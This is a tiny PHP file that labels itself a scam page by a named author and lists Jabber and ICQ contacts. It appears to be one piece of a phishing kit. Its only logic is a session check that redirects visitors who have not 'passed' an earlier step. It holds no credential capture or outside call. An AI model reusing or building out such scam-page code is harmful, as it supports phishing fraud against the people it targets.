<?php
//SCAMPAGE BY BLACKCODER.RU
//Jabber: slackerz@jodo.im
//ICQ: 713566330

session_start();


if (!isset($_SESSION['passed'])) {
	header('Location : ' . $redirect);
	exit;
}
?>